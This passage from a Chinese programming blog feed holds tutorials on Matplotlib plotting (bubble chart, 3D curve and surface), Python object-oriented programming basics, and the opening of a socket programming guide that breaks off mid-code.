class="hljs-comment">#绘制y=x^3曲线</span><br>plt.legend([<span class="hljs-string">&#x27;y=x&#x27;</span>,<span class="hljs-string">&#x27;y=x^3&#x27;</span>])<br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="代码逻辑：-1"><a href="#代码逻辑：-1" class="headerlink" title="代码逻辑："></a>代码逻辑：</h4><p>1.使用<code>numpy</code>的<code>arange</code>函数生成一个从0到2.1的等差数列，包含21个元素，步长为0.1。这个数列将用作图表中的x坐标。</p><p>2.计算四个幂函数的y值：</p><p>3.调用<code>plt.plot</code>函数绘制四个曲线：第一个参数是x坐标数组，第二个参数是y坐标数组，这里绘制的是y1。第三个参数是线条样式，这里设置为实线。第四个参数是线条宽度，这里设置为3。第五个参数是图例标签，这里使用了<code>LaTeX</code>数学表达式。</p><p>4.调用<code>plt.legend</code>函数添加图例，设置以下参数：<code>title=&quot;Power function&quot;</code>：图例的标题。<code>loc=&quot;upper left&quot;</code>：图例的位置，位于图表的左上角。<code>bbox_to_anchor=(0.05,0.95)</code>：设置图例的锚点位置，即图例相对于图表的位置。<code>shadow=True</code>：显示图例的阴影。<code>fancybox=True</code>：使用更美观的图例框。</p><h4 id="结果：-2"><a href="#结果：-2" class="headerlink" title="结果："></a>结果：</h4><p><img src="/../img/mat7.jpg" alt="img"> </p><h3 id="4-气泡图"><a href="#4-气泡图" class="headerlink" title="4.气泡图"></a>4.气泡图</h3><h4 id="代码实现：-3"><a href="#代码实现：-3" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> matplotlib <span class="hljs-keyword">as</span> mp<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x=np.random.randn(<span class="hljs-number">100</span>)<br>y=np.random.randn(<span class="hljs-number">100</span>)<br>s=np.power(<span class="hljs-number">5</span>*x+<span class="hljs-number">10</span>*y,<span class="hljs-number">2</span>)<br>c=np.random.rand(<span class="hljs-number">100</span>)<br>cm=mp.cm.RdYlBu<br>marker=<span class="hljs-string">&#x27;o&#x27;</span><br>plt.scatter(x,y,s=s,c=c,cmap=cm)<br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="代码逻辑：-2"><a href="#代码逻辑：-2" class="headerlink" title="代码逻辑："></a>代码逻辑：</h4><p>1.使用<code>numpy</code>的<code>random.randn</code>函数生成两个包含100个元素的随机数数组，分别作为散点图中的x和y坐标。</p><p>2.使用<code>numpy</code>的<code>power</code>函数计算一个包含100个元素的数组，这些数是5<em>x + 10</em>y的平方。这个数组将用作散点图中每个点的面积（大小）。</p><p>3.使用<code>numpy</code>的<code>random.rand</code>函数生成一个包含100个元素的随机数数组，作为散点图中每个点的颜色。</p><p>4.调用<code>matplotlib.cm.RdYlBu</code>获取一个颜色映射对象，该对象定义了颜色空间的转换。</p><p>5.调用<code>plt.scatter</code>函数绘制散点图，传入x和y坐标数组，以及大小和颜色数组，并设置参数：<code>s=s</code>：设置每个点的面积（大小）。<code>c=c</code>：设置每个点的颜色。<code>cmap=cm</code>：设置颜色映射对象，用于根据点的颜色数组生成实际的RGB颜色。<code>marker=&#39;o&#39;</code>：设置标记样式为圆形。</p><p>6.最后，调用<code>plt.show</code>函数显示绘制的散点图。</p><h4 id="结果：-3"><a href="#结果：-3" class="headerlink" title="结果："></a>结果：</h4><p><img src="/../img/mat8.jpg" alt="img"> </p><h3 id="5-三维曲线"><a href="#5-三维曲线" class="headerlink" title="5.三维曲线"></a>5.三维曲线</h3><h4 id="代码实现：-4"><a href="#代码实现：-4" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib <span class="hljs-keyword">as</span> mpl<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>mpl.rcParams[<span class="hljs-string">&#x27;legend.fontsize&#x27;</span>] = <span class="hljs-number">10</span><br>fig = plt.figure()<br><span class="hljs-comment"># ax = fig.gca(projection = &#x27;3d&#x27;)</span><br>ax = fig.add_subplot(projection = <span class="hljs-string">&#x27;3d&#x27;</span>)<br>theta = np.linspace(-<span class="hljs-number">4</span> * np.pi, <span class="hljs-number">4</span> * np.pi, <span class="hljs-number">100</span>)<br>z = np.linspace(-<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">100</span>)<br>r = z**<span class="hljs-number">2</span> + <span class="hljs-number">1</span><br>x = r * np.sin(theta)<br>y = r * np.cos(theta)<br>ax.plot(x, y, z, label=<span class="hljs-string">&#x27;3D curve&#x27;</span>)<br>ax.legend()<br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="代码逻辑：-3"><a href="#代码逻辑：-3" class="headerlink" title="代码逻辑："></a>代码逻辑：</h4><p>1.设置<code>matplotlib</code>的<code>legend.fontsize</code>为10，以调整图例的字体大小。</p><p>2.创建一个新的图表<code>fig</code>。</p><p>3.使用<code>fig.add_subplot</code>函数添加一个<code>Axes3D</code>对象，并设置<code>projection=&#39;3d&#39;</code>参数以创建一个三维坐标轴。</p><p>4.使用<code>np.linspace</code>函数生成一个从-4π到4π的等差数列，包含100个元素，作为角度<code>theta</code>的值。</p><p>5.使用<code>np.linspace</code>函数生成一个从-2到2的等差数列，包含100个元素，作为z轴的值。</p><p>6.计算r轴的值，它是z轴值的平方加上1。计算x轴和y轴的值，它们分别是r轴值的sin和cos。</p><p>7.调用<code>ax.plot</code>函数绘制三维曲线，传入x、y、z坐标数组，并设置标签为<code>’3D curve’</code>。</p><p>8.调用<code>ax.legend</code>函数添加图例，并设置字体大小为10。</p><p>9.最后，调用<code>plt.show</code>函数显示绘制的图表。</p><h4 id="结果：-4"><a href="#结果：-4" class="headerlink" title="结果："></a>结果：</h4><p><img src="/../img/mat9.jpg" alt="img"></p><h3 id="6-3D函数"><a href="#6-3D函数" class="headerlink" title="6.3D函数"></a>6.3D函数</h3><h4 id="代码实现：-5"><a href="#代码实现：-5" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment"># 创建一个 figure</span><br>fig = plt.figure()<br><span class="hljs-comment"># 创建一个 3D 轴</span><br>ax = fig.add_subplot(<span class="hljs-number">111</span>, projection=<span class="hljs-string">&#x27;3d&#x27;</span>)<br><span class="hljs-comment"># 定义 x 和 y 的值</span><br>x = np.linspace(-<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>)<br>y = np.linspace(-<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>)<br>x, y = np.meshgrid(x, y)<br><span class="hljs-comment"># 计算 z 的值</span><br>z = x**<span class="hljs-number">2</span> + y**<span class="hljs-number">2</span><br><span class="hljs-comment"># 绘制曲面图</span><br>ax.plot_surface(x, y, z, cmap=<span class="hljs-string">&#x27;viridis&#x27;</span>)<br><span class="hljs-comment"># 设置标题和标签</span><br>ax.set_title(<span class="hljs-string">&#x27;3D Surface Plot of z = x^2 + y^2&#x27;</span>)<br>ax.set_xlabel(<span class="hljs-string">&#x27;X axis&#x27;</span>)<br>ax.set_ylabel(<span class="hljs-string">&#x27;Y axis&#x27;</span>)<br>ax.set_zlabel(<span class="hljs-string">&#x27;Z axis&#x27;</span>)<br><br>plt.show()<br></code></pre></td></tr></table></figure><h4 id="代码逻辑：-4"><a href="#代码逻辑：-4" class="headerlink" title="代码逻辑："></a>代码逻辑：</h4><p>1.创建图形和3D轴：这里的<code>fig</code>是一个图形对象，<code>ax</code>是一个3D轴对象，用于后续的绘图。</p><p>2.定义x和y的数据：<code>np.linspace</code>生成了x和y的数据点，范围从-5到5，共100个点。<code>np.meshgrid</code>则将这些数据点转换成网格形式，以便用于计算z的值。</p><p>3.计算z的值：这里的z是根据函数z &#x3D; x^2 + y^2计算得到的，它将形成一个圆形的碗状曲面。</p><p>4.绘制曲面图：<code>plot_surface</code>函数使用x, y, z的数据来绘制一个曲面图，<code>cmap</code>参数指定了颜色映射。</p><p>5.设置标题和标签：这些函数为图形添加了标题和轴标签，以便于理解。</p><p>6.最后，<code>plt.show()</code>被调用来显示图形。</p><p>整个代码的逻辑是将数学函数z &#x3D; x^2 + y^2转换为3D图形，以便直观地展示函数的曲面形状。通过调整x和y的值以及函数表达式，可以探索不同的数学曲面。</p><h4 id="结果：-5"><a href="#结果：-5" class="headerlink" title="结果："></a>结果：</h4><p><img src="/../img/mat10.jpg" alt="img"></p><h3 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h3><p>这只是一些Matplotlib的基础示例。Matplotlib提供了许多其他图表和示例，可以下载源码自行修改，用于自定义图表的外观、样式、标签等。参考Matplotlib的官方示例：<a href="https://matplotlib.org/stable/gallery/index">Matplotlib示例</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三方库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python（四）</title>
      <link href="/2024/05/25/class/"/>
      <url>/2024/05/25/class/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><p>Python面向对象编程（Object-Oriented Programming，简称OOP）是一种编程范式，它通过将数据和方法绑定成一个对象来实现程序设计和代码重用的思想。Python从设计之初就已经是一门面向对象的语言，因此在Python中创建类和对象是非常容易的。</p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>类是定义对象的模板，包含了对象的属性和方法。类通过继承、多态等机制实现代码的复用和扩展。</p><p>对象是类的实例，每个对象都有其独特的属性和方法。对象可以通过类进行实例化。</p><p>属性是对象的数据部分，可以通过类中的<code>__init__</code>方法进行初始化。</p><p>方法是类中定义的函数，用于操作对象的属性。方法可以访问和修改对象的状态。</p><p>继承是指一个类可以继承另一个类的属性和方法，从而实现代码的复用。</p><p>多态是指不同类的对象可以对同一消息做出响应，即同一接口下不同的实现方式。</p><h3 id="创建类和对象"><a href="#创建类和对象" class="headerlink" title="创建类和对象"></a>创建类和对象</h3><p>在Python中创建类和对象的步骤如下：</p><p>使用关键字<code>class</code>来定义一个类。类名通常以大写字母开头，并且每个单词的首字母都大写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name  = name<br>        self.age  = age<br></code></pre></td></tr></table></figure><p>使用类名加上括号来创建对象实例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p1 = Person(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p>可以通过对象实例访问其属性和方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(p1.name )  <span class="hljs-comment"># 输出: 张三</span><br><span class="hljs-built_in">print</span>(p1.age )   <span class="hljs-comment"># 输出: 30</span><br></code></pre></td></tr></table></figure><h3 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h3><p>Python中的类还有一些特殊方法，如<code>__init__</code>、<code>__str__</code>、<code>__repr__</code>等，这些方法用于初始化对象、返回字符串表示形式等。</p><p>例如，<code>__init__</code>方法用于初始化对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name  = name<br>        self.age  = age<br></code></pre></td></tr></table></figure><p><code>__str__</code>方法用于返回对象的字符串表示形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name  = name<br>        self.age  = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name &#125;</span> is <span class="hljs-subst">&#123;self.age &#125;</span> years old.&quot;</span><br></code></pre></td></tr></table></figure><h3 id="继承和多态"><a href="#继承和多态" class="headerlink" title="继承和多态"></a>继承和多态</h3><p>继承允许新创建的类继承现有类的属性和方法，从而避免重复代码。多态则是指不同类的对象可以对同一消息做出响应。</p><p>例如，假设有一个基类<code>Animal</code>，以及一个继承自<code>Animal</code>的子类<code>Dog</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sound</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The animal makes a sound.&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sound</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The dog barks.&quot;</span>)<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>Dog</code>类通过继承<code>Animal</code>类并覆盖<code>sound</code>方法，实现了多态。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Python面向对象编程通过类和对象的概念，将数据和行为封装在一起，使得代码更加模块化、易于维护和扩展。通过学习和掌握面向对象编程的基本概念和技巧，可以有效地提高编程能力和项目开发效率。</p><h4 id="类和对象的高级特性"><a href="#类和对象的高级特性" class="headerlink" title="类和对象的高级特性"></a>类和对象的高级特性</h4><p>在Python中，面向对象编程（OOP）具有许多高级特性，这些特性使得类和对象的功能更加强大和灵活。以下是一些主要的高级特性：</p><ol><li><strong>特殊方法</strong>：<ul><li><code>__init__</code>：构造函数，用于初始化对象。</li><li><code>__str__</code>：返回对象的字符串表示形式。</li><li><code>__repr__</code>：返回对象的描述性字符串表示形式。</li><li><code>__len__</code>：返回对象的长度。</li><li><code>__add__</code>、<code>__sub__</code>、<code>__mul__</code>、<code>__div__</code>、<code>__mod__</code>、<code>__pow__</code>：分别对应加、减、乘、除、取模、幂运算。</li><li><code>__eq__</code>、<code>__ne__</code>、<code>__lt__</code>、<code>__gt__</code>、<code>__le__</code>、<code>__ge__</code>：分别对应等于、不等于、小于、大于、小于等于、大于等于。</li><li><code>__call__</code>：使对象可以像函数一样被调用。</li></ul></li><li><strong>访问控制</strong>：<ul><li>属性装饰器（getter、setter、deleter）用于控制属性的读写权限。</li></ul></li><li><strong>继承和多态</strong>：<ul><li>继承机制允许一个类继承另一个类的属性和方法。</li><li>多态是指不同类的对象可以通过相同的接口进行操作。</li></ul></li><li><strong>类方法和静态方法</strong>：<ul><li>类方法是在类级别上操作的方法，可以通过类本身或类的实例调用。类方法使用 <code>@classmethod</code> 装饰器来定义，并且第一个参数是类本身（通常命名为 <code>cls</code>）。</li><li>静态方法是与类相关的方法，但不需要类的实例即可调用。静态方法使用 <code>@staticmethod</code> 装饰器来定义。</li></ul></li><li><strong>数据封装</strong>：<ul><li>数据封装是将数据（属性）和操作数据的代码（方法）捆绑在一起，使得对象的内部状态对外部隐藏，从而提高了代码的安全性和可维护性。</li></ul></li><li><strong>多重继承</strong>：<ul><li>多重继承允许一个类同时继承多个基类的属性和方法。</li></ul></li><li><strong>元类</strong>：<ul><li>元类是创建类的类，可以用来定义如何创建类本身。元类可以用来实现更复杂的类创建逻辑，如自动注册类实例等。</li></ul></li><li><strong>单例模式</strong>：<ul><li>单例模式确保一个类只有一个实例，并提供一个全局访问点来获取这个唯一实例。</li></ul></li><li><strong>迭代器和生成器</strong>：<ul><li>迭代器用于逐个访问序列中的元素，生成器则用于延迟计算，节省内存。</li></ul></li><li><strong>上下文管理器</strong>：<ul><li>上下文管理器用于资源管理，如文件打开、锁定等。</li></ul></li><li><strong>协程</strong>：<ul><li>协程是一种轻量级线程，用于非阻塞的并发编程。</li></ul></li><li><strong>闭包</strong>：<ul><li>闭包用于保存函数局部变量的引用，以便在函数外部访问这些变量。</li></ul></li><li><strong>内存管理</strong>：<ul><li>Python提供了垃圾回收机制来自动管理内存，减少内存泄漏的风险。</li></ul></li></ol><h4 id="多态性"><a href="#多态性" class="headerlink" title="多态性"></a>多态性</h4><p>在Python中实现多态性主要通过以下几种方式：</p><ol><li><strong>方法重写</strong>：子类可以重写父类中的同名方法，从而实现不同的行为。</li><li><strong>接口（或抽象基类）</strong>：定义一个接口，子类必须实现这些方法。然后，可以编写接受接口的代码，这样就可以在运行时根据对象的实际类型调用相应的方法。</li><li><strong>鸭子类型多态</strong>：只要一个对象具有某些特定的方法或属性，就可以被当作另一个对象使用，而无需考虑它们的具体类型。</li></ol><p>下面提供一个具体的示例来说明如何在Python中实现多态性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义一个动物类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name  = name<br><br>    <span class="hljs-comment"># 定义一个叫方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name &#125;</span> says something&quot;</span>)<br><br><span class="hljs-comment"># 定义一个猫类，继承自动物类，并重写speak方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)<br><br>    <span class="hljs-comment"># 重写speak方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name &#125;</span> meows&quot;</span>)<br><br><span class="hljs-comment"># 定义一个狗类，继承自动物类，并重写speak方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name)<br><br>    <span class="hljs-comment"># 重写speak方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name &#125;</span> barks&quot;</span>)<br><br><span class="hljs-comment"># 创建猫和狗的实例</span><br>cat = Cat(<span class="hljs-string">&quot;Kitty&quot;</span>)<br>dog = Dog(<span class="hljs-string">&quot;Barky&quot;</span>)<br><br><span class="hljs-comment"># 调用speak方法</span><br>cat.speak ()<br>dog.speak ()<br></code></pre></td></tr></table></figure><p>在这个示例中，我们定义了一个<code>Animal</code>类和两个子类<code>Cat</code>和<code>Dog</code>。每个子类都重写了<code>speak</code>方法，以实现不同的行为。当我们创建猫和狗的实例并调用<code>speak</code>方法时，Python会自动调用正确的实现方式，从而实现多态性。</p><p>这种方式不需要显式地声明接口，只需关注对象的接口即可。</p><h4 id="继承机制"><a href="#继承机制" class="headerlink" title="继承机制"></a>继承机制</h4><p>Python中的继承机制是面向对象编程（OOP）三大特性之一，允许子类继承父类的属性和方法，从而实现代码的重用和扩展。在Python中，子类通过<code>class</code>关键字和父类名定义，可以支持单继承和多继承。</p><h5 id="如何工作"><a href="#如何工作" class="headerlink" title="如何工作"></a>如何工作</h5><ol><li><strong>单继承</strong>：子类继承一个父类的所有属性和方法。<br>子类可以通过父类名来访问父类的成员，也可以使用<code>super()</code>函数调用父类的同名方法。</li><li><strong>多继承</strong>：子类可以同时继承多个父类的属性和方法，这种机制在某些情况下可以简化代码，但也容易导致混乱和复杂性。</li><li><strong>方法解析顺序（MRO）</strong>：在多继承的情况下，Python采用广度优先的顺序来解析方法调用，这意味着如果多个父类中有同名方法，Python会按照从左到右的顺序查找并调用相应的方法。</li></ol><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ol><li><strong>代码复用</strong>：继承机制极大地提高了代码的复用性，使得子类可以继承父类和祖类的方法以及属性。</li><li><strong>模块化和层次化</strong>：继承可以创建类体系，提高代码的模块化和层次化，有助于实现更清晰的设计。</li><li><strong>易于扩展</strong>：通过继承，新类可以轻松添加或修改继承自父类的成员，方便进行功能的扩展和修改。</li></ol><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ol><li><strong>违背直观思维</strong>：继承表达的是一种“是”什么的关系，而不是“包含”什么的关系，这可能会让一些初学者感到困惑。</li><li><strong>多重继承的复杂性</strong>：虽然多重继承可以简化代码，但它也容易导致混乱和复杂性，特别是在处理同名方法时。</li><li><strong>子类化内置类型的缺点</strong>：子类化内置类型可能会破坏内置类型的行为，导致不可预测的结果。</li></ol><p>Python中的继承机制通过允许子类继承父类的属性和方法，极大地提高了代码的复用性和模块化。</p><h4 id="类定义的三种方法"><a href="#类定义的三种方法" class="headerlink" title="类定义的三种方法"></a>类定义的三种方法</h4><p>在Python中，<code>__init__</code>、<code>__str__</code>和<code>__repr__</code>方法是类定义中的特殊方法，分别用于对象的初始化、字符串表示形式和如何重新创建对象。</p><ol><li><strong><code>__init__</code> 方法</strong>：<ul><li><strong>作用</strong>：<code>__init__</code>方法是一个特殊的函数，当创建一个类的新实例时，Python解释器会自动调用它。它的主要目的是初始化对象的状态，即设置对象的属性或执行必要的设置操作。</li><li><strong>使用场景</strong>：在每次创建新对象时，都可以通过<code>__init__</code>方法进行初始化设定。例如，可以在这个方法中为对象设置初始值、连接数据库等。</li></ul></li><li><strong><code>__str__</code> 方法</strong>：<ul><li><strong>作用</strong>：<code>__str__</code>方法用于定义一个对象的字符串表示形式。当我们通过使用<code>print</code>函数或将对象转换为字符串时，Python会调用这个方法来获取对象的字符串表示。</li><li><strong>使用场景</strong>：通常用于生成用户友好的输出，或者当需要将对象转换为字符串以便于阅读和传输时。</li></ul></li><li><strong><code>__repr__</code> 方法</strong>：<ul><li><strong>作用</strong>：<code>__repr__</code>方法返回一个字符串，该字符串描述了如何重新创建该对象。如果你将这个字符串传递给<code>eval()</code>函数，你将得到与原始对象相同的值。</li><li><strong>使用场景</strong>：当需要精确地描述如何重新创建对象时使用。例如，在调试过程中，开发者可能需要看到一个对象的详细信息，以便于复现问题或进行进一步的操作。</li></ul></li></ol><p>总结来说，<code>__init__</code>用于对象的初始化，<code>__str__</code>用于生成用户友好的字符串表示，而<code>__repr__</code>则用于生成可以重新创建对象的字符串表示。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 类（class） </tag>
            
            <tag> 面向对象编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket</title>
      <link href="/2024/05/18/socket/"/>
      <url>/2024/05/18/socket/</url>
      
        <content type="html"><![CDATA[<h1 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h1><p>Socket编程是一种网络编程范式，它允许不同的计算机或设备在网络中进行通信。在网络编程中，socket是一个抽象层，它提供了一个通信端点，使得数据可以在网络上发送和接收。Socket编程通常用于TCP（传输控制协议）或UDP（用户数据报协议）协议。</p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li><strong>Socket（套接字）</strong>：一个socket是通信链路的一个端点，可以看作是电话的插孔，允许数据在其中进出。</li><li><strong>TCP vs UDP</strong>：<ul><li><strong>TCP（传输控制协议）</strong>：提供一种面向连接、可靠的数据传输服务。它保证数据包按顺序到达，且没有损失或重复。</li><li><strong>UDP（用户数据报协议）</strong>：提供一种无连接的服务，不保证数据包的顺序或可靠性。</li></ul></li><li><strong>IP地址和端口</strong>：IP地址用于标识网络中的设备，而端口号用于标识设备上的特定服务或应用程序。</li></ol><h3 id="Python中的Socket编程"><a href="#Python中的Socket编程" class="headerlink" title="Python中的Socket编程"></a>Python中的Socket编程</h3><p>在Python中，<code>socket</code>模块提供了创建socket通信的基本函数和类。</p><h4 id="创建Socket"><a href="#创建Socket" class="headerlink" title="创建Socket"></a>创建Socket</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-comment"># 创建TCP/IP socket</span><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-comment"># 创建UDP socket</span><br>u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br></code></pre></td></tr></table></figure><h4 id="绑定端口"><a href="#绑定端口" class="headerlink" title="绑定端口"></a>绑定端口</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 绑定到特定地址和端口</span><br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8080</span>))<br></code></pre></td></tr></table></figure><h4 id="监听连接"><a href="#监听连接" class="headerlink" title="监听连接"></a>监听连接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 开始监听，参数表示最大连接数</span><br>s.listen(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h4 id="接受连接"><a href="#接受连接" class="headerlink" title="接受连接"></a>接受连接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 接受一个新连接</span><br>conn, addr = s.accept()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;连接地址：&#x27;</span>, 